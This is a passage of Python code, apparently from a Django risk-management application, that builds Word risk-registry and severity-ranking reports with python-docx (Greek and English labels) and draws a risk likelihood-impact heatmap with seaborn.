    # Remove existing vertical alignment if it exists
    existing_alignment = cell_properties.find(qn('w:vAlign'))
    if existing_alignment is not None:
        cell_properties.remove(existing_alignment)
        
    cell_properties.append(vertical_alignment)


from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Inches, Pt
from docx.enum.section import WD_ORIENT
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
import re

def add_residual_risk_pivot_section(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    opportunity_bg_color = 'C9DAF8'  # Light blue for opportunity section
    threat_bg_color = 'F4CCCC'  # Light red for threat section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section

    document.add_page_break()
    document.add_heading('\nΜητρώο Κινδύνων (Risk Registry) ανά Κατηγορία (Category)', level=1)

    document.add_paragraph(
        'Ο πίνακας παρουσιάζει το Μητρώο Κινδύνων (Risk Registry) ανά Κατηγορία (Category), παρέχοντας μια οργανωμένη επισκόπηση των κινδύνων που συνδέονται με κάθε έργο. '
        'Αυτή η ομαδοποίηση διευκολύνει τον εντοπισμό βασικών τομέων κινδύνου και την αξιολόγηση της σοβαρότητάς τους, επιτρέποντας την εστίαση σε κρίσιμα σημεία για την επιτυχία του έργου.'
    )
    document.add_paragraph(
        'Για κάθε κατηγορία κινδύνου, περιλαμβάνονται οι αρχικοί (inherent), οι υπολειμματικοί (residual) και οι στοχευμένοι (targeted) δείκτες κινδύνου, '
        'αποκαλύπτοντας το αρχικό επίπεδο κινδύνου και το επίπεδο κινδύνου μετά τις μετριαστικές δράσεις. '
        'Αυτή η περίληψη παρέχει σημαντικά δεδομένα για τη λήψη στρατηγικών αποφάσεων στη διαχείριση κινδύνων του έργου.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT

    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio', 'category')

    pivot_data = {}
    for risk in all_risks:
        category_name = risk.category.name if risk.category else "Χωρίς Κατηγορία (Uncategorized)"
        if category_name not in pivot_data:
            pivot_data[category_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[category_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'opportunities': [(opportunity.title, opportunity.description) for opportunity in risk.opportunities.all()],
            'threats': [(threat.title, threat.description) for threat in risk.threats.all()],
            'mitigations': [(mitigation.title, mitigation.description) for mitigation in risk.mitigations.all()]
        })

    sorted_categories = sorted(pivot_data.keys())

    for category in sorted_categories:
        document.add_page_break()
        document.add_heading(category, level=2)

        risks = pivot_data[category]
        risk_number = 1

        for risk in risks:
            if risk_number > 1:
                document.add_page_break()

            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Αξιολόγηση (Rank)", "Αρχικός Δείκτης (Inherent Score)", "Υπολειμματικός Δείκτης (Residual Score)", "Στοχευμένος Δείκτης (Targeted Score)"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Add Risk Title and Description
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Κίνδυνος (Risk)"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            title_row = table.add_row().cells
            title_row[0].text = "Τίτλος (Title)"
            title_row[1].merge(title_row[3])
            add_html_to_word(document, title_row[1].paragraphs[0], risk['title'])

            desc_row = table.add_row().cells
            desc_row[0].text = "Περιγραφή (Description)"
            desc_row[1].merge(desc_row[3])
            add_html_to_word(document, desc_row[1].paragraphs[0], risk['description'])

            # Add Opportunities (if any)
            if risk['opportunities']:
                opportunities_header = table.add_row().cells
                opportunities_header[0].merge(opportunities_header[3])
                opportunities_header[0].text = "Ευκαιρίες (Opportunities)"
                tc_pr = opportunities_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), opportunity_bg_color)
                tc_pr.append(shd)

                for opportunity_title, opportunity_desc in risk['opportunities']:
                    add_detail_rows(document, table, opportunity_title, opportunity_desc, "Title", "Description")

            # Add Threats (if any)
            if risk['threats']:
                threats_header = table.add_row().cells
                threats_header[0].merge(threats_header[3])
                threats_header[0].text = "Απειλές (Threats)"
                tc_pr = threats_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:fill'), threat_bg_color)
                tc_pr.append(shd)

                for threat_title, threat_desc in risk['threats']:
                    add_detail_rows(document, table, threat_title, threat_desc, "Title", "Description")

            # Add Mitigations
            mitigations_header = table.add_row().cells
            mitigations_header[0].merge(mitigations_header[3])
            mitigations_header[0].text = "Μέτρα Μείωσης (Mitigations)"
            tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:fill'), mitigation_bg_color)
            tc_pr.append(shd)

            for mitigation_title, mitigation_desc in risk['mitigations']:
                add_detail_rows(document, table, mitigation_title, mitigation_desc, "Title", "Description")

            risk_number += 1


from docx import Document
from docx.shared import Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from docx import Document
from docx.shared import Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from docx import Document
from docx.shared import Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from docx import Document
from docx.shared import Inches
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

def add_residual_risk_pivot_section_perportfolio(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    opportunity_bg_color = 'C9DAF8'  # Light blue for opportunity section
    threat_bg_color = 'F4CCCC'  # Light red for threat section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section

    document.add_page_break()
    document.add_heading('\nRisk Registry per Portfolio', level=1)

    document.add_paragraph(
        '\nThe table presents the Risk Registry by Portfolio, providing an organized overview.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT

    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio')

    pivot_data = {}
    for risk in all_risks:
        portfolio_name = risk.portfolio.name if risk.portfolio else "Uncategorized"
        if portfolio_name not in pivot_data:
            pivot_data[portfolio_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[portfolio_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'opportunities': [(opportunity.title, opportunity.description) for opportunity in risk.opportunities.all()],
            'threats': [(threat.title, threat.description) for threat in risk.threats.all()],
            'mitigations': [(mitigation.title, mitigation.description) for mitigation in risk.mitigations.all()],
        })

    sorted_portfolios = sorted(pivot_data.keys())

    for portfolio in sorted_portfolios:
        document.add_page_break()
        document.add_heading(portfolio, level=2)

        risks = pivot_data[portfolio]
        risk_number = 1

        for risk in risks:
            if risk_number > 1:
                document.add_page_break()

            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Rank", "Inherent Score", "Residual Score", "Targeted Score"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores, centered
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"

            # Apply color based on risk score
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Add Risk Title and Description
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Risk"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            title_row = table.add_row().cells
            title_row[0].text = "Title"
            title_row[0].paragraphs[0].runs[0].bold = True
            title_row[1].merge(title_row[3])
            title_paragraph = title_row[1].paragraphs[0]
            add_html_to_word(document, title_paragraph, risk['title'])

            desc_row = table.add_row().cells
            desc_row[0].text = "Description"
            desc_row[0].paragraphs[0].runs[0].bold = True
            desc_row[1].merge(desc_row[3])
            desc_paragraph = desc_row[1].paragraphs[0]
            add_html_to_word(document, desc_paragraph, risk['description'])

            # Add Opportunities Section (if exists)
            if risk['opportunities']:
                opportunities_header = table.add_row().cells
                opportunities_header[0].merge(opportunities_header[3])
                opportunities_header[0].text = "Opportunities"
                opportunities_header[0].paragraphs[0].runs[0].bold = True
                tc_pr = opportunities_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), opportunity_bg_color)
                tc_pr.append(shd)

                for opportunity_title, opportunity_desc in risk['opportunities']:
                    op_title_row = table.add_row().cells
                    op_title_row[0].text = "Title"
                    op_title_row[0].paragraphs[0].runs[0].bold = True
                    op_title_row[1].merge(op_title_row[3])
                    add_html_to_word(document, op_title_row[1].paragraphs[0], opportunity_title)

                    op_desc_row = table.add_row().cells
                    op_desc_row[0].text = "Description"
                    op_desc_row[0].paragraphs[0].runs[0].bold = True
                    op_desc_row[1].merge(op_desc_row[3])
                    add_html_to_word(document, op_desc_row[1].paragraphs[0], opportunity_desc)

            # Add Threats Section (if exists)
            if risk['threats']:
                threats_header = table.add_row().cells
                threats_header[0].merge(threats_header[3])
                threats_header[0].text = "Threats"
                threats_header[0].paragraphs[0].runs[0].bold = True
                tc_pr = threats_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), threat_bg_color)
                tc_pr.append(shd)

                for threat_title, threat_desc in risk['threats']:
                    th_title_row = table.add_row().cells
                    th_title_row[0].text = "Title"
                    th_title_row[0].paragraphs[0].runs[0].bold = True
                    th_title_row[1].merge(th_title_row[3])
                    add_html_to_word(document, th_title_row[1].paragraphs[0], threat_title)

                    th_desc_row = table.add_row().cells
                    th_desc_row[0].text = "Description"
                    th_desc_row[0].paragraphs[0].runs[0].bold = True
                    th_desc_row[1].merge(th_desc_row[3])
                    add_html_to_word(document, th_desc_row[1].paragraphs[0], threat_desc)

            # Add Mitigations Section
            mitigations_header = table.add_row().cells
            mitigations_header[0].merge(mitigations_header[3])
            mitigations_header[0].text = "Mitigations"
            mitigations_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), mitigation_bg_color)
            tc_pr.append(shd)

            for mitigation_title, mitigation_desc in risk['mitigations']:
                mit_title_row = table.add_row().cells
                mit_title_row[0].text = "Title"
                mit_title_row[0].paragraphs[0].runs[0].bold = True
                mit_title_row[1].merge(mit_title_row[3])
                add_html_to_word(document, mit_title_row[1].paragraphs[0], mitigation_title)

                mit_desc_row = table.add_row().cells
                mit_desc_row[0].text = "Description"
                mit_desc_row[0].paragraphs[0].runs[0].bold = True
                mit_desc_row[1].merge(mit_desc_row[3])
                add_html_to_word(document, mit_desc_row[1].paragraphs[0], mitigation_desc)

            risk_number += 1


def add_residual_risk_pivot_section_perportfolio_en(document, selected_portfolios):
    header_color = 'ADD8E6'  # Light blue for headers
    risk_bg_color = 'D9EAD3'  # Light green for risk section
    opportunity_bg_color = 'C9DAF8'  # Light blue for opportunity section
    threat_bg_color = 'F4CCCC'  # Light red for threat section
    mitigation_bg_color = 'FCE5CD'  # Light orange for mitigation section

    document.add_page_break()
    document.add_heading('\nRisk Registry per Portfolio', level=1)

    document.add_paragraph(
        '\nThe table presents the Risk Registry by Portfolio, providing an organized overview.'
    )

    section = document.sections[-1]
    section.orientation = WD_ORIENT.PORTRAIT
    section.page_width, section.page_height = section.page_height, section.page_width  # Swap back for portrait

    selected_portfolio_ids = [portfolio.id for portfolio in selected_portfolios]
    all_risks = Risk.objects.filter(portfolio_id__in=selected_portfolio_ids).select_related('portfolio')

    pivot_data = {}
    for risk in all_risks:
        portfolio_name = risk.portfolio.name if risk.portfolio else "Uncategorized"
        if portfolio_name not in pivot_data:
            pivot_data[portfolio_name] = []

        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        pivot_data[portfolio_name].append({
            'title': risk.title,
            'description': risk.description,
            'inherent_score': inherent_score,
            'residual_score': residual_score,
            'targeted_score': targeted_score,
            'inherent_detail': f"{risk.inherent_likelihood} x {risk.inherent_impact}",
            'residual_detail': f"{risk.residual_likelihood} x {risk.residual_impact}",
            'targeted_detail': f"{risk.targeted_likelihood} x {risk.targeted_impact}",
            'opportunities': [(opportunity.title, opportunity.description) for opportunity in risk.opportunities.all()],
            'threats': [(threat.title, threat.description) for threat in risk.threats.all()],
            'mitigations': [(mitigation.title, mitigation.description) for mitigation in risk.mitigations.all()],
        })

    sorted_portfolios = sorted(pivot_data.keys())

    for portfolio in sorted_portfolios:
        document.add_page_break()
        document.add_heading(portfolio, level=2)

        risks = pivot_data[portfolio]
        risk_number = 1

        for risk in risks:
            if risk_number > 1:
                document.add_page_break()

            # Table structure for Rank and Scores
            table = document.add_table(rows=2, cols=4)
            table.style = 'Table Grid'

            # Row 1: Headers for Rank and Scores
            hdr_cells = table.rows[0].cells
            headers = ["Rank", "Inherent Score", "Residual Score", "Targeted Score"]
            for i, header in enumerate(headers):
                hdr_cells[i].text = header
                hdr_cells[i].paragraphs[0].runs[0].bold = True
                hdr_cells[i].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
                tc_pr = hdr_cells[i]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), header_color)
                tc_pr.append(shd)

            # Row 2: Actual Values with Color-coded Scores, centered
            value_cells = table.rows[1].cells
            value_cells[0].text = str(risk_number)
            value_cells[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
            value_cells[1].text = f"{risk['inherent_detail']} = {risk['inherent_score']}"
            value_cells[2].text = f"{risk['residual_detail']} = {risk['residual_score']}"
            value_cells[3].text = f"{risk['targeted_detail']} = {risk['targeted_score']}"

            # Apply color based on risk score
            apply_score_color(value_cells[1], risk['inherent_score'])
            apply_score_color(value_cells[2], risk['residual_score'])
            apply_score_color(value_cells[3], risk['targeted_score'])

            # Add Risk Title and Description
            risk_header = table.add_row().cells
            risk_header[0].merge(risk_header[3])
            risk_header[0].text = "Risk"
            risk_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = risk_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), risk_bg_color)
            tc_pr.append(shd)

            title_row = table.add_row().cells
            title_row[0].text = "Title"
            title_row[0].paragraphs[0].runs[0].bold = True
            title_row[1].merge(title_row[3])
            title_paragraph = title_row[1].paragraphs[0]
            add_html_to_word(document, title_paragraph, risk['title'])

            desc_row = table.add_row().cells
            desc_row[0].text = "Description"
            desc_row[0].paragraphs[0].runs[0].bold = True
            desc_row[1].merge(desc_row[3])
            desc_paragraph = desc_row[1].paragraphs[0]
            add_html_to_word(document, desc_paragraph, risk['description'])

            # Add Opportunities Section (if exists)
            if risk['opportunities']:
                opportunities_header = table.add_row().cells
                opportunities_header[0].merge(opportunities_header[3])
                opportunities_header[0].text = "Opportunities"
                opportunities_header[0].paragraphs[0].runs[0].bold = True
                tc_pr = opportunities_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), opportunity_bg_color)
                tc_pr.append(shd)

                for opportunity_title, opportunity_desc in risk['opportunities']:
                    op_title_row = table.add_row().cells
                    op_title_row[0].text = "Title"
                    op_title_row[0].paragraphs[0].runs[0].bold = True
                    op_title_row[1].merge(op_title_row[3])
                    add_html_to_word(document, op_title_row[1].paragraphs[0], opportunity_title)

                    op_desc_row = table.add_row().cells
                    op_desc_row[0].text = "Description"
                    op_desc_row[0].paragraphs[0].runs[0].bold = True
                    op_desc_row[1].merge(op_desc_row[3])
                    add_html_to_word(document, op_desc_row[1].paragraphs[0], opportunity_desc)

            # Add Threats Section (if exists)
            if risk['threats']:
                threats_header = table.add_row().cells
                threats_header[0].merge(threats_header[3])
                threats_header[0].text = "Threats"
                threats_header[0].paragraphs[0].runs[0].bold = True
                tc_pr = threats_header[0]._element.get_or_add_tcPr()
                shd = OxmlElement('w:shd')
                shd.set(qn('w:val'), 'clear')
                shd.set(qn('w:fill'), threat_bg_color)
                tc_pr.append(shd)

                for threat_title, threat_desc in risk['threats']:
                    th_title_row = table.add_row().cells
                    th_title_row[0].text = "Title"
                    th_title_row[0].paragraphs[0].runs[0].bold = True
                    th_title_row[1].merge(th_title_row[3])
                    add_html_to_word(document, th_title_row[1].paragraphs[0], threat_title)

                    th_desc_row = table.add_row().cells
                    th_desc_row[0].text = "Description"
                    th_desc_row[0].paragraphs[0].runs[0].bold = True
                    th_desc_row[1].merge(th_desc_row[3])
                    add_html_to_word(document, th_desc_row[1].paragraphs[0], threat_desc)

            # Add Mitigations Section
            mitigations_header = table.add_row().cells
            mitigations_header[0].merge(mitigations_header[3])
            mitigations_header[0].text = "Mitigations"
            mitigations_header[0].paragraphs[0].runs[0].bold = True
            tc_pr = mitigations_header[0]._element.get_or_add_tcPr()
            shd = OxmlElement('w:shd')
            shd.set(qn('w:val'), 'clear')
            shd.set(qn('w:fill'), mitigation_bg_color)
            tc_pr.append(shd)

            for mitigation_title, mitigation_desc in risk['mitigations']:
                mit_title_row = table.add_row().cells
                mit_title_row[0].text = "Title"
                mit_title_row[0].paragraphs[0].runs[0].bold = True
                mit_title_row[1].merge(mit_title_row[3])
                add_html_to_word(document, mit_title_row[1].paragraphs[0], mitigation_title)

                mit_desc_row = table.add_row().cells
                mit_desc_row[0].text = "Description"
                mit_desc_row[0].paragraphs[0].runs[0].bold = True
                mit_desc_row[1].merge(mit_desc_row[3])
                add_html_to_word(document, mit_desc_row[1].paragraphs[0], mitigation_desc)

            risk_number += 1

def get_score_color(score):
    if score >= 15:
        return 'FF6F6F'  # Red for high risk
    elif score >= 8:
        return 'FFD700'  # orange for medium risk
    else:
        return '90EE90'  # Green for low risk

def apply_cell_color(cell, color_hex):
    tc_pr = cell._element.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:val'), 'clear')
    shd.set(qn('w:color'), 'auto')
    shd.set(qn('w:fill'), color_hex)
    tc_pr.append(shd)




from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.enum.section import WD_SECTION




from docx.shared import Pt, Inches
from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from django.utils import timezone
from orm.models import Risk

def set_column_width(cell, width_in_inches):
    """
    Sets the width of a table cell in inches using proper Word attributes.
    """
    tcPr = cell._tc.get_or_add_tcPr()
    tcW = OxmlElement('w:tcW')
    tcW.set(qn('w:w'), str(int(width_in_inches * 1440)))  # Twips = 1/20 of a point
    tcW.set(qn('w:type'), 'dxa')  # Fixed width type
    tcPr.append(tcW)


def set_cell_background(cell, color):
    """
    Set the background color of a table cell.
    """
    tcPr = cell._tc.get_or_add_tcPr()
    shd = OxmlElement('w:shd')
    shd.set(qn('w:fill'), color)  # Hex color code without #
    tcPr.append(shd)

def get_score_color(score):
    """
    Return a color code based on the risk score.
    """
    if score >= 15:
        return 'FF0000'  # Red for high scores
    elif score >= 10:
        return 'FFFF00'  # orange for medium scores
    else:
        return '00FF00'  # Green for low scores

def apply_cell_color(cell, color):
    """
    Apply a background color to a cell.
    """
    set_cell_background(cell, color)

from html import unescape

# def add_html_to_word(document, paragraph, html_content):
#     text_content = unescape(html_content)  # Decodes HTML entities like &alpha;
#     run = paragraph.add_run(text_content)
#     run.font.name = 'Calibri'

from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

def add_executive_risk_severity_list(document):
    # Start with a page break
    document.add_page_break()
    # Executive Summary Title
    document.add_heading('\nΛίστα Βαρύτητας Κινδύνων (Risk Severity List)', level=1)

    # Description for the severity list with reference to Annex 1
    document.add_paragraph(
        'Ο παρακάτω πίνακας κατατάσσει τους κινδύνους κατά σειρά βαρύτητας, με βάση τη βαθμολογία υπολειπόμενης '
        '(Residual) επικινδυνότητας. Οι βαθμολογίες εγγενούς (Inherent), υπολειπόμενης (Residual) και στοχευμένης '
        '(Targeted) επικινδυνότητας απεικονίζουν το επίπεδο κινδύνου πριν και μετά την εφαρμογή των μέτρων μετριασμού. '
        'Για περισσότερες λεπτομέρειες, παρακαλώ ανατρέξτε στο Παράρτημα 1.'
    )

    # Retrieve and sort risks
    from django.db.models import Q

    all_risks = (
        Risk.objects.exclude(
            Q(portfolio__name__icontains="archive") | 
            Q(portfolio__name__icontains="sub") | 
            Q(portfolio__name__icontains="set")
        )
        .select_related('portfolio')  # Remove category and just use portfolio
    )

    risks_sorted = sorted(all_risks, key=lambda r: (r.residual_likelihood or 0) * (r.residual_impact or 0), reverse=True)

    # Create a table with a title row and header rows
    table = document.add_table(rows=1, cols=6)
    table.style = 'Table Grid'

    # Define and style the header cells
    hdr_cells = table.rows[0].cells
    headers = ['Rank', 'Portfolio', 'Risk Title', 'Inherent', 'Residual', 'Targeted']
    for cell, header in zip(hdr_cells, headers):
        cell.text = header
        run = cell.paragraphs[0].runs[0]
        run.bold = True
        run.font.size = Pt(8)
        cell.paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
        set_cell_background(cell, 'B7DEE8')  # Light blue color for header

    # Set specific column widths
    set_column_width(hdr_cells[0], 0.5)  # Rank column
    set_column_width(hdr_cells[2], 3)  # Title
    set_column_width(hdr_cells[3], 0.5)  # Inherent
    set_column_width(hdr_cells[4], 0.5)  # Residual
    set_column_width(hdr_cells[5], 0.5)  # Targeted

    # Repeat header row on each page
    tr = table.rows[0]._tr
    tbl_header = OxmlElement("w:tblHeader")
    tbl_header.set(qn("w:val"), "true")
    tr.get_or_add_trPr().append(tbl_header)

    # Populate the table with sorted risks
    risk_number = 1
    for risk in risks_sorted:
        # Calculate scores
        inherent_score = (risk.inherent_likelihood or 0) * (risk.inherent_impact or 0)
        residual_score = (risk.residual_likelihood or 0) * (risk.residual_impact or 0)
        targeted_score = (risk.targeted_likelihood or 0) * (risk.targeted_impact or 0)

        # Create table row for each risk
        risk_row = table.add_row().cells
        risk_row[0].text = str(risk_number)
        risk_row[0].paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER

        # Add portfolio and risk title
        risk_row[1].text = risk.portfolio.name if risk.portfolio else "Unassigned"
        add_html_to_word(document, risk_row[2].paragraphs[0], risk.title)

        # Add scores
        score_cells = [risk_row[3], risk_row[4], risk_row[5]]
        scores = [inherent_score, residual_score, targeted_score]
        for cell, score in zip(score_cells, scores):
            cell.text = f"{score}"
            cell.paragraphs[0].alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
            apply_cell_color(cell, get_score_color(score))

        risk_number += 1

    document.add_paragraph('\n')  # Add space after the table


from docx.oxml import OxmlElement
from docx.oxml.ns import qn
from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

def add_footer_with_page_numbering(document):
    # Access the footer of the document's main section
    footer = document.sections[0].footer  # Use the first section's footer directly

    # Left side of the footer: "Page n of y"
    paragraph_left = footer.paragraphs[0]
    paragraph_left.text = "Page "
    paragraph_left.alignment = WD_PARAGRAPH_ALIGNMENT.LEFT
    run = paragraph_left.add_run()

    # Insert PAGE field to display the current page number
    page_field = OxmlElement('w:fldSimple')
    page_field.set(qn('w:instr'), "PAGE")
    run._r.append(page_field)

    # Insert " of " and NUMPAGES field for total page count
    run.add_text(" of ")
    numpages_field = OxmlElement('w:fldSimple')
    numpages_field.set(qn('w:instr'), "NUMPAGES")
    run._r.append(numpages_field)

    # Center of the footer: Greek "Confidential" (Εμπιστευτικό)
    paragraph_center = footer.add_paragraph("Εμπιστευτικό")
    paragraph_center.alignment = WD_PARAGRAPH_ALIGNMENT.CENTER
    paragraph_center.runs[0].font.size = Pt(10)



import io
import base64
import matplotlib.pyplot as plt
from matplotlib.colors import BoundaryNorm, ListedColormap
import seaborn as sns
from django.shortcuts import render
from orm.models import Risk

import io
import base64
import matplotlib.pyplot as plt
from matplotlib.colors import BoundaryNorm, ListedColormap
import seaborn as sns

def generate_new_interactive_heatmap(title, data, score_data, risk_type, request):
    total_risks = sum(len(cell) for row in data for cell in row)
    username = request.user.username

    bounds = [0, 7, 15, 25]
    colors = ['green', 'orange', 'red']
    cmap = ListedColormap(colors)
    norm = BoundaryNorm(bounds, cmap.N)

    plt.figure(figsize=(6, 4))

    ax = sns.heatmap(
        score_data[::-1],
        annot=False,
        cmap=cmap,
        norm=norm,
        fmt="d",
        linewidths=.5,
        cbar=False
    )

    ax.set_title(f"Risk Heatmap for {username} | Total Risks: {total_risks}", fontsize=10)
    ax.set_xlabel('Impact', fontsize=10)
    ax.set_ylabel('Likelihood', fontsize=10)
    ax.set_xticklabels(['1', '2', '3', '4', '5'], fontsize=8)
    ax.set_yticklabels(['5', '4', '3', '2', '1'], rotation=0, fontsize=8)

    x_coords, y_coords, bubble_sizes = [], [], []

    for i in range(5):
        for j in range(5):
            count = len(data[::-1][i][j])
            if count > 0:
                x_coords.append(j + 0.5)
                y_coords.append(i + 0.5)
                bubble_sizes.append(count * 100)

                ax.text(j + 0.5, i + 0.5, f'{count}',
                        ha='center', va='center', color='black', fontsize=10, weight='bold')

    plt.scatter(x_coords, y_coords, s=bubble_sizes, alpha=0.5, color='blue', edgecolors='black')

    buffer = io.BytesIO()
    plt.savefig(buffer, format='png')
    plt.close()
    buffer.seek(0)

    image_base64 = base64.b64encode(buffer.read()).decode('utf-8')
    heatmap_image = f"<img src='data:image/png;base64,{image_base64}' alt='Risk Heatmap' usemap='#{risk_type}_map'>"

    map_html = f"<map name='{risk_type}_map'>"
    width, height = 600, 400
    cell_width = width / 5
    cell_height = height / 5

    for i in range(5):
        for j in range(5):
            if len(data[::-1][i][j]) > 0:
                x1, y1 = j * cell_width, i * cell_height
                x2, y2 = (j + 1) * cell_width, (i + 1) * cell_height
